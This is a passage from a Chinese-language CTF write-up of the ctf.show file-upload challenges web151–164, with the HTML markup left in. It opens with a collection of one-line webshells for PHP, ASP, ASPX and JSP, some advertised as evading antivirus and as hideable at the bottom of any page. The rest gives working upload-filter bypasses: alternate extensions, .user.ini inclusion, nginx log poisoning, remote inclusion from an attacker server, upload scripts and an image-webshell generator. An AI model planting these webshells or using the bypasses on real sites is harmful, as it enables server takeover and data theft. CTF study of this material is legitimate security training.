class="token string single-quoted-string">'cc'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token delimiter important">?></span></span> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[email]/e"</span><span class="token punctuation">,</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'h'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>/*使用这个后,使用菜刀一句话客户端在配置连接的时候在"配置"一栏输入*/:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>O</span><span class="token punctuation">></span></span>h=@eval_r($_POST1);<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>O</span><span class="token punctuation">></span></span> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token string backtick-quoted-string">`$_GET['r']`</span> <span class="token delimiter important">?></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">language</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>php<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">@<span class="token function">eval_r</span><span class="token punctuation">(</span>$_POST<span class="token punctuation">[</span>sb<span class="token punctuation">]</span><span class="token punctuation">)</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span> //绕过<span class="token php language-php"><span class="token delimiter important">&lt;?</span>限制的一句话<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token function">php</span> <span class="token punctuation">(</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token delimiter important">?></span></span>   上面这句是防杀防扫的！网上很少人用！可以插在网页任何ASP文件的最底部不会出错，比如 index.asp里面也是可以的！<span class="token php language-php"><span class="token delimiter important">&lt;?</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">system</span> <span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span> 加了判断的PHP一句话，与上面的ASP一句话相同道理，也是可以插在任何PHP文件 的最底部不会出错！&lt;%execute request(“class”)%>&lt;%'&lt;% loop &lt;%:%>&lt;%'&lt;% loop &lt;%:%>&lt;%execute request (“class”)%>&lt;%execute request(“class”)'&lt;% loop &lt;%:%> 无防下载表，有防下载表可尝试插入以下语句突破的一句话 &lt;%eval(request(“1″)):response.end%> 备份专用</code></pre><pre class="language-jsp" data-language="jsp"><code class="language-jsp">##JSP：&lt;%if(request.getParameter(&quot;f&quot;)!&#x3D;null)(newjava.io.FileOutputStream (application.getRealPath(&quot;\\&quot;)+request.getParameter(&quot;f&quot;))).write (request.getParameter(&quot;t&quot;).getBytes());%&gt; 提交客户端 &lt;form action&#x3D;&quot;&quot; method&#x3D;&quot;post&quot;&gt;&lt;textareaname&#x3D;&quot;t&quot;&gt;&lt;&#x2F;textarea&gt;&lt;br&#x2F;&gt;&lt;input type&#x3D;&quot;submit&quot;value&#x3D;&quot;提交&quot;&gt;&lt;&#x2F;form&gt;</code></pre><pre class="language-asp" data-language="asp"><code class="language-asp">##ASP&lt;%eval(Request.Item[&quot;r00ts&quot;],”unsafe”);%&gt;&lt;%IfRequest(“1″)&lt;&gt;”&quot;ThenExecuteGlobal(Request(“1″))%&gt; &lt;%execute(request(“1″))%&gt; &lt;scriptrunat&#x3D;server&gt;execute request(“1″)&lt;&#x2F;script&gt; 不用&#39;&lt;,&gt;‘的asp一句话 </code></pre><pre class="language-asp" data-language="asp"><code class="language-asp">##aspx&lt;scriptrunat&#x3D;”server”&gt;WebAdmin2Y.x.y aaaaa &#x3D;newWebAdmin2Y.x.y (“add6bb58e139be10″);&lt;&#x2F;script&gt; &lt;script language&#x3D;&quot;C#&quot;runat&#x3D;&quot;server&quot;&gt;WebAdmin2Y.x.y a&#x3D;new WebAdmin2Y.x.y(&quot;add6bb58e139be10&quot;)&lt;&#x2F;script&gt; &lt;%eval request(chr(35))%&gt;  不用双引号的一句话。</code></pre><h4 id="常见绕过姿势"><a href="#常见绕过姿势" class="headerlink" title="常见绕过姿势"></a>常见绕过姿势</h4><h5 id="大写绕过-或-同解析后缀名绕过"><a href="#大写绕过-或-同解析后缀名绕过" class="headerlink" title="大写绕过 或 同解析后缀名绕过"></a>大写绕过 或 同解析后缀名绕过</h5><pre class="language-txt" data-language="txt"><code class="language-txt">同解析名后缀：　　PHP：.php .php2 .php3 .php4 .php5 .php6 .php7 .php空格 .phtml .pgif　　　　 .shtml .htaccess .phar .inc 　　ASP：.asp .aspx .config .ashx .asmx .aspq .axd .cshtm .cshtml .rem .soap　　　　 .vbhtm .vbhtml .asa .cer .shtml　　JSP：.jsp .jspx .jsw .jsv .sjspf .wss .do .action</code></pre><p>简单来说就是用各种姿势绕过服务器处理逻辑上传木马拿到WebShell</p><h3 id="web151-170"><a href="#web151-170" class="headerlink" title="web151-170"></a>web151-170</h3><h4 id="web151-Js前端限制"><a href="#web151-Js前端限制" class="headerlink" title="web151(Js前端限制)"></a>web151(Js前端限制)</h4><p>前端限制了只能上传png文件，可以抓包后修改文件后缀名</p><p><img src="web151.png" loading="lazy"></p><p>Payload：</p><blockquote><p>&#x2F;upload&#x2F;1.php</p><p>POST:attack&#x3D;system(‘tac ..&#x2F;flag.php’);</p></blockquote><h4 id="web152-MIME后端绕过"><a href="#web152-MIME后端绕过" class="headerlink" title="web152(MIME后端绕过)"></a>web152(MIME后端绕过)</h4><p>虽然后端简单检测，但是如果直接上传png,抓包的时候再改后缀，其实不用修改Content-Type，方法同上</p><p><strong>MIME</strong></p><p>MIME（Multipurpose Internal MailExtensions）多用途互联网邮件扩展类型。<br>是设定某种扩展名的文件用一种应用程序来打开的方式类型，当该扩展名文件被访问的时候，浏览器会自动指定应用程序来打开。多用于来指定一些客户端自定义的文件名，以及一些媒体文件打开方式。<br>每个MIME类型由两部分组成，前面是数据的大类型，例如声音audio，图像image等，后面定义具体的种类<br><strong>常见的MIME类型：</strong><br>超文本标记语言文本：.html——&gt;text&#x2F;html<br>xml文档：.xml——&gt;text&#x2F;xml<br>XHTML文档：.xhtml——&gt;application&#x2F;xhtml+xml<br>普通文本：.txt——&gt;text&#x2F;plain<br>RTF文本：.rtf——&gt;application&#x2F;rtf<br>png图片:.png——&gt;image&#x2F;png</p><p>这应该是预期解，有点麻烦</p><blockquote><p>上传一个php文件，同时用burp抓包，将burp中的Content-Type:<br>application&#x2F;octet-stream修改为Content-Type:<br>image&#x2F;png，即让服务器认为这个文件是一个图片文件去解析执行</p></blockquote><h4 id="web153-user-ini"><a href="#web153-user-ini" class="headerlink" title="web153(.user.ini)"></a>web153(.user.ini)</h4><p>常规姿势都试了发现没法绕过，发现upload可以访问，说明里面含有php文件可以考虑使用.user.ini绕过</p><p><strong>.user.ini</strong></p><ul><li>当前目录里面有php文件的时候，可以运用ini配置文件进行配置这个php文件</li><li>和文件包含有关的配置项有auto_append_file和auto_prepend_file</li></ul><p>原理: 指定一个文件（如a.jpg），那么该文件就会被包含在要执行的php文件中（如index.php）类</p><p>似于在index.php中插入一句：require(.&#x2F;a.jpg);这两个设置的区别只是在于auto_prepend_file是在</p><p>文件前插入；auto_append_file在文件最后插入（当文件调用的有exit()时该设置无效）所以要求当</p><p>前目录必须要有php文件,巧合的是这题upload目录下有个index.php所以这种方式是可以成功的。</p><pre class="language-ini" data-language="ini"><code class="language-ini"><span class="token key attr-name">auto_prepend_file</span><span class="token punctuation">=</span><span class="token value attr-value">1.txt</span></code></pre><p>然后上传1.txt 这个1.txt木马就被自动包含进原来目录里的php文件了（一般是index.php）</p><p>Payload：&#x2F;upload?attack&#x3D;system(‘tac ..&#x2F;flag.php’);</p><h4 id="web154-PHP短标签"><a href="#web154-PHP短标签" class="headerlink" title="web154(PHP短标签)"></a>web154(PHP短标签)</h4><p>发现上传失败，应该是对txt文件里的内容有过滤经检测，查验之后发现是对<code>php</code>这三个字母过滤了</p><p>PHP标签绕过：</p><ul><li><p>长标签：<?php ?></p></li><li><p>短标签：<? ?>、<?=  ?>、&lt;%  %&gt;、&lt;%&#x3D;  %&gt;</p></li><li><p>其中 <?  ?> 需要开启 short_open_tag&#x3D;On ，&lt;%  %&gt; 需要开启 asp_tags&#x3D;On</p></li></ul><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token delimiter important">?></span></span></code></pre><h4 id="web155"><a href="#web155" class="headerlink" title="web155"></a>web155</h4><p>自带 .user.ini，但不影响，payload 与 web154 一致</p><h4 id="web156"><a href="#web156" class="headerlink" title="web156"></a>web156</h4><p>过滤了<code>[]</code></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">&#123;</span><span class="token string single-quoted-string">'attack'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><h4 id="web157-nginx文件包含"><a href="#web157-nginx文件包含" class="headerlink" title="web157(nginx文件包含)"></a>web157(nginx文件包含)</h4><p>过滤了<code>;``&#123;&#125;</code>，但是不影响，可以直接在1.txt里面执行命令</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token function">system</span><span class="token punctuation">(</span>tac <span class="token operator">.</span><span class="token operator">.</span><span class="token operator">/</span>fla<span class="token operator">*</span><span class="token punctuation">)</span><span class="token delimiter important">?></span></span></code></pre><p>其他：</p><p>由于我们 $_POST[] 只使用一个参数并且为数组格式，考虑使用 array_pop() 弹出最后一个单元</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token function">array_pop</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token delimiter important">?></span></span></code></pre><p>由web158的黑名单得来，#nginx 的日志会获取 UA头 信息#bp 抓包,在 UA头 进行注入</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?</span><span class="token keyword">include</span> <span class="token string single-quoted-string">'tac /var/log/nginx/access.log'</span><span class="token delimiter important">?></span></span></code></pre><h4 id="web158"><a href="#web158" class="headerlink" title="web158"></a>web158</h4><p>ban了log，可改为</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?</span><span class="token keyword">include</span> <span class="token string single-quoted-string">'tac /var/l'</span><span class="token operator">.</span><span class="token string single-quoted-string">'og/nginx/access.l'</span><span class="token operator">.</span><span class="token string single-quoted-string">'og'</span><span class="token delimiter important">?></span></span></code></pre><h4 id="web159"><a href="#web159" class="headerlink" title="web159"></a>web159</h4><p>ban了()，但是可以使用反引号直接执行命令，或者之前的nginx日志注入</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?</span><span class="token keyword">include</span> <span class="token string single-quoted-string">'/var/lo'</span><span class="token operator">.</span><span class="token string single-quoted-string">'g/nginx/access.l'</span><span class="token operator">.</span><span class="token string single-quoted-string">'og'</span><span class="token delimiter important">?></span></span></code></pre><h4 id="web160"><a href="#web160" class="headerlink" title="web160"></a>web160</h4><p>空格，反引号被ban了</p><p>突破空格过滤可以用换行符%0a</p><p>可以继续日志注入或者php伪协议</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token keyword">include</span><span class="token string double-quoted-string">"ph"</span><span class="token operator">.</span><span class="token string double-quoted-string">"p://filter/convert.base64-encode/resource=../flag.p"</span><span class="token operator">.</span><span class="token string double-quoted-string">"hp"</span><span class="token delimiter important">?></span></span></code></pre><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token keyword">include</span><span class="token string double-quoted-string">"/var/lo"</span><span class="token operator">.</span><span class="token string double-quoted-string">"g/nginx/access.lo"</span><span class="token operator">.</span><span class="token string double-quoted-string">"g"</span><span class="token delimiter important">?></span></span></code></pre><h4 id="web161-伪造图片头GIF89a"><a href="#web161-伪造图片头GIF89a" class="headerlink" title="web161(伪造图片头GIF89a)"></a>web161(伪造图片头GIF89a)</h4><p>增加了对图片头的识别，用了getimagesize()进行检测</p><p>getimagesize(): 会对目标文件的16进制去进行一个读取，去读取头几个字符串是不是符合图片的要求</p><p>ini问价和一句话木马前都要加一句GIF89a，或者改成png文件头89 50 4E 47</p><pre class="language-php" data-language="php"><code class="language-php">GIF89a<span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token delimiter important">?></span></span></code></pre><h4 id="web162-条件竞争-远程文件包含"><a href="#web162-条件竞争-远程文件包含" class="headerlink" title="web162(条件竞争 远程文件包含)"></a>web162(条件竞争 远程文件包含)</h4><p>内容ban了<code>.</code>之前方法就不行了，可以包含<code>/tmp/sess_&#123;sessid&#125;</code>进行条件竞争</p><p>也可以进行远程文件包含</p><ol><li><p>将木马上传至远程服务器，由于过滤了. 所以需要转换下，mm</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>或者<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'cat ../f*'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre></li><li><p>上传包含文件 .user.ini</p><pre class="language-ini" data-language="ini"><code class="language-ini">GIF89a<span class="token key attr-name">auto_prepend_file</span><span class="token punctuation">=</span><span class="token value attr-value">txt</span></code></pre></li><li><p>上传远程调用文件 txt <a href="https://www.bejson.com/convert/ip2int/">IP转数字</a></p><pre class="language-php" data-language="php"><code class="language-php">GIF89a<span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token keyword">include</span><span class="token string double-quoted-string">"http://数字IP/mm"</span><span class="token delimiter important">?></span></span></code></pre></li><li><p>访问upload</p></li></ol><p><strong>但是我在尝试的时候，总是返回400😅</strong></p><p>于是看到了另一个非预期，通过异或编码绕过这里不能直接用 python 的 urllib.parse.unquote 函数编码参数，需要自行写一个 int2byte </p><p>的函数，这里遇到个坑。</p><p>顺带用 python 实现了下 php 中对字符串的取反，其实就是 <code>255 - 字符的ascii</code> 得到的 ascii 取字符。于是就有了如下脚本。</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">def</span> <span class="token function">str2neg_bytes</span><span class="token punctuation">(</span>target<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bytes</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string">b''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token builtin">list</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">255</span><span class="token operator">-</span><span class="token builtin">ord</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> byteorder<span class="token operator">=</span><span class="token string">'big'</span><span class="token punctuation">)</span> <span class="token keyword">for</span> c <span class="token keyword">in</span> target<span class="token punctuation">)</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">"/var/log/nginx/access.log"</span>file_content <span class="token operator">=</span> <span class="token string">"&lt;?=include~"</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> str2neg_bytes<span class="token punctuation">(</span>payload<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"?>"</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>burp0_url <span class="token operator">=</span> <span class="token string">"https://f0c1c895-2920-42b8-8f40-cff4a3a610b3.challenge.ctf.show/upload.php"</span>burp0_headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"Accept"</span><span class="token punctuation">:</span> <span class="token string">"application/json, text/javascript, */*; q=0.01"</span><span class="token punctuation">,</span> <span class="token string">"X-Requested-With"</span><span class="token punctuation">:</span> <span class="token string">"XMLHttpRequest"</span><span class="token punctuation">,</span> <span class="token string">"User-Agent"</span><span class="token punctuation">:</span> <span class="token string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36 &lt;?=system('tac ../fla*');?>"</span><span class="token punctuation">,</span> <span class="token string">"Content-Type"</span><span class="token punctuation">:</span> <span class="token string">"multipart/form-data; boundary=----WebKitFormBoundaryv0k4Ho2WfgKjvEM4"</span><span class="token punctuation">,</span> <span class="token string">"Accept-Encoding"</span><span class="token punctuation">:</span> <span class="token string">"gzip, deflate"</span><span class="token punctuation">,</span> <span class="token string">"Accept-Language"</span><span class="token punctuation">:</span> <span class="token string">"zh-CN,zh;q=0.9"</span><span class="token punctuation">,</span> <span class="token string">"Connection"</span><span class="token punctuation">:</span> <span class="token string">"close"</span><span class="token punctuation">&#125;</span>burp0_data <span class="token operator">=</span> <span class="token string">"------WebKitFormBoundaryv0k4Ho2WfgKjvEM4\r\nContent-Disposition: form-data; name=\"file\"; filename=\"file\"\r\nContent-Type: image/png\r\n\r\nGIF78a\r\n"</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> file_content <span class="token operator">+</span> <span class="token string">"\r\n\r\n\r\n------WebKitFormBoundaryv0k4Ho2WfgKjvEM4--\r\n"</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>burp0_url<span class="token punctuation">,</span> headers<span class="token operator">=</span>burp0_headers<span class="token punctuation">,</span> data<span class="token operator">=</span>burp0_data<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>file_content<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span></code></pre><h4 id="web163"><a href="#web163" class="headerlink" title="web163"></a>web163</h4><p>上传图片后，会被删除，所以需要在上传的瞬间，就post命令执行，还可以直接在配置文件里远程包含，然后访问&#x2F;upload&#x2F;index.php。</p><p>这样就不用即时去post了。（这个要求服务器开启了远程包含选项）</p><p>同样也可以使用上面脚本</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">def</span> <span class="token function">str2neg_bytes</span><span class="token punctuation">(</span>target<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bytes</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string">b''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token builtin">list</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">255</span><span class="token operator">-</span><span class="token builtin">ord</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> byteorder<span class="token operator">=</span><span class="token string">'big'</span><span class="token punctuation">)</span> <span class="token keyword">for</span> c <span class="token keyword">in</span> target<span class="token punctuation">)</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">"php://filter/convert.base64-encode/resource=/var/www/html/flag.php"</span>file_content <span class="token operator">=</span> <span class="token string">"&lt;?=include~"</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> str2neg_bytes<span class="token punctuation">(</span>payload<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"?>"</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>burp0_url <span class="token operator">=</span> <span class="token string">"https://ff4fcc76-8205-41ea-a4ba-52f257147647.challenge.ctf.show/upload.php"</span>burp0_headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"Accept"</span><span class="token punctuation">:</span> <span class="token string">"application/json, text/javascript, */*; q=0.01"</span><span class="token punctuation">,</span> <span class="token string">"X-Requested-With"</span><span class="token punctuation">:</span> <span class="token string">"XMLHttpRequest"</span><span class="token punctuation">,</span> <span class="token string">"User-Agent"</span><span class="token punctuation">:</span> <span class="token string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"</span><span class="token punctuation">,</span> <span class="token string">"Content-Type"</span><span class="token punctuation">:</span> <span class="token string">"multipart/form-data; boundary=----WebKitFormBoundaryv0k4Ho2WfgKjvEM4"</span><span class="token punctuation">,</span> <span class="token string">"Accept-Encoding"</span><span class="token punctuation">:</span> <span class="token string">"gzip, deflate"</span><span class="token punctuation">,</span> <span class="token string">"Accept-Language"</span><span class="token punctuation">:</span> <span class="token string">"zh-CN,zh;q=0.9"</span><span class="token punctuation">,</span> <span class="token string">"Connection"</span><span class="token punctuation">:</span> <span class="token string">"close"</span><span class="token punctuation">&#125;</span>burp0_data <span class="token operator">=</span> <span class="token string">"------WebKitFormBoundaryv0k4Ho2WfgKjvEM4\r\nContent-Disposition: form-data; name=\"file\"; filename=\"file\"\r\nContent-Type: image/png\r\n\r\nGIF78a\r\n"</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> file_content <span class="token operator">+</span> <span class="token string">"\r\n\r\n\r\n------WebKitFormBoundaryv0k4Ho2WfgKjvEM4--\r\n"</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>burp0_url<span class="token punctuation">,</span> headers<span class="token operator">=</span>burp0_headers<span class="token punctuation">,</span> data<span class="token operator">=</span>burp0_data<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>file_content<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span></code></pre><h4 id="web164-png图片二次渲染"><a href="#web164-png图片二次渲染" class="headerlink" title="web164(png图片二次渲染)"></a>web164(png图片二次渲染)</h4><p>这一关考察png图片二次渲染，经过上传图片后再次将图片下载下来经过对比，使用010editor发现经过了二次渲染，很多地方的数据都</p><p>不一样了</p><blockquote><p>所谓二次渲染，就是网站将用户所上传的文件，由于各种原因（适配网站显示，防止木马）等，将文件中的数据进行修改，对二次渲</p><p>染的绕过即将源文件与上传之后的文件进行对比，找出没有发生变化的数据位置，将后门代码插入没有发生变化的数据的位置。对于</p><p>绕过二次渲染，人工绕过几乎不可能，这就需要使用脚本来进行构建图片马。</p></blockquote><p>某不知名佬写的代码,参考<a href="https://blog.csdn.net/qq_46918279/article/details/120575503">CTFSHOW-文件上传</a></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$p</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">0xa3</span><span class="token punctuation">,</span> <span class="token number">0x9f</span><span class="token punctuation">,</span> <span class="token number">0x67</span><span class="token punctuation">,</span> <span class="token number">0xf7</span><span class="token punctuation">,</span> <span class="token number">0x0e</span><span class="token punctuation">,</span> <span class="token number">0x93</span><span class="token punctuation">,</span> <span class="token number">0x1b</span><span class="token punctuation">,</span> <span class="token number">0x23</span><span class="token punctuation">,</span>           <span class="token number">0xbe</span><span class="token punctuation">,</span> <span class="token number">0x2c</span><span class="token punctuation">,</span> <span class="token number">0x8a</span><span class="token punctuation">,</span> <span class="token number">0xd0</span><span class="token punctuation">,</span> <span class="token number">0x80</span><span class="token punctuation">,</span> <span class="token number">0xf9</span><span class="token punctuation">,</span> <span class="token number">0xe1</span><span class="token punctuation">,</span> <span class="token number">0xae</span><span class="token punctuation">,</span>           <span class="token number">0x22</span><span class="token punctuation">,</span> <span class="token number">0xf6</span><span class="token punctuation">,</span> <span class="token number">0xd9</span><span class="token punctuation">,</span> <span class="token number">0x43</span><span class="token punctuation">,</span> <span class="token number">0x5d</span><span class="token punctuation">,</span> <span class="token number">0xfb</span><span class="token punctuation">,</span> <span class="token number">0xae</span><span class="token punctuation">,</span> <span class="token number">0xcc</span><span class="token punctuation">,</span>           <span class="token number">0x5a</span><span class="token punctuation">,</span> <span class="token number">0x01</span><span class="token punctuation">,</span> <span class="token number">0xdc</span><span class="token punctuation">,</span> <span class="token number">0x5a</span><span class="token punctuation">,</span> <span class="token number">0x01</span><span class="token punctuation">,</span> <span class="token number">0xdc</span><span class="token punctuation">,</span> <span class="token number">0xa3</span><span class="token punctuation">,</span> <span class="token number">0x9f</span><span class="token punctuation">,</span>           <span class="token number">0x67</span><span class="token punctuation">,</span> <span class="token number">0xa5</span><span class="token punctuation">,</span> <span class="token number">0xbe</span><span class="token punctuation">,</span> <span class="token number">0x5f</span><span class="token punctuation">,</span> <span class="token number">0x76</span><span class="token punctuation">,</span> <span class="token number">0x74</span><span class="token punctuation">,</span> <span class="token number">0x5a</span><span class="token punctuation">,</span> <span class="token number">0x4c</span><span class="token punctuation">,</span>           <span class="token number">0xa1</span><span class="token punctuation">,</span> <span class="token number">0x3f</span><span class="token punctuation">,</span> <span class="token number">0x7a</span><span class="token punctuation">,</span> <span class="token number">0xbf</span><span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token punctuation">,</span> <span class="token number">0x6b</span><span class="token punctuation">,</span> <span class="token number">0x88</span><span class="token punctuation">,</span> <span class="token number">0x2d</span><span class="token punctuation">,</span>           <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token number">0x65</span><span class="token punctuation">,</span> <span class="token number">0x7d</span><span class="token punctuation">,</span> <span class="token number">0x52</span><span class="token punctuation">,</span> <span class="token number">0x9d</span><span class="token punctuation">,</span> <span class="token number">0xad</span><span class="token punctuation">,</span> <span class="token number">0x88</span><span class="token punctuation">,</span> <span class="token number">0xa1</span><span class="token punctuation">,</span>           <span class="token number">0x66</span><span class="token punctuation">,</span> <span class="token number">0x44</span><span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">,</span> <span class="token number">0x33</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token variable">$img</span> <span class="token operator">=</span> <span class="token function">imagecreatetruecolor</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$y</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$y</span> <span class="token operator">&lt;</span> <span class="token function">sizeof</span><span class="token punctuation">(</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$y</span> <span class="token operator">+=</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>   <span class="token variable">$r</span> <span class="token operator">=</span> <span class="token variable">$p</span><span class="token punctuation">[</span><span class="token variable">$y</span><span class="token punctuation">]</span><span class="token punctuation">;</span>   <span class="token variable">$g</span> <span class="token operator">=</span> <span class="token variable">$p</span><span class="token punctuation">[</span><span class="token variable">$y</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>   <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token variable">$p</span><span class="token punctuation">[</span><span class="token variable">$y</span><span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>   <span class="token variable">$color</span> <span class="token operator">=</span> <span class="token function">imagecolorallocate</span><span class="token punctuation">(</span><span class="token variable">$img</span><span class="token punctuation">,</span> <span class="token variable">$r</span><span class="token punctuation">,</span> <span class="token variable">$g</span><span class="token punctuation">,</span> <span class="token variable">$b</span><span class="token 